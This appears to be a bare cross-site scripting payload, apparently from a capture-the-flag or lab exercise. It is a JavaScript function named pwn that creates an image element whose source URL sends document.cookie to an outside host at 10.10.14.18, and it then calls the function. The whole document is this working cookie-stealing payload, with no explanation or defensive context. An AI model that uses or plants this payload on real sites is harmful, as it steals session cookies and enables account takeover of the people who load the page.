function pwn() {
    var img = document.createElement("img");
    img.src = "http://10.10.14.18/xss?=" + document.cookie;
    document.body.appendChild(img);
}
pwn();
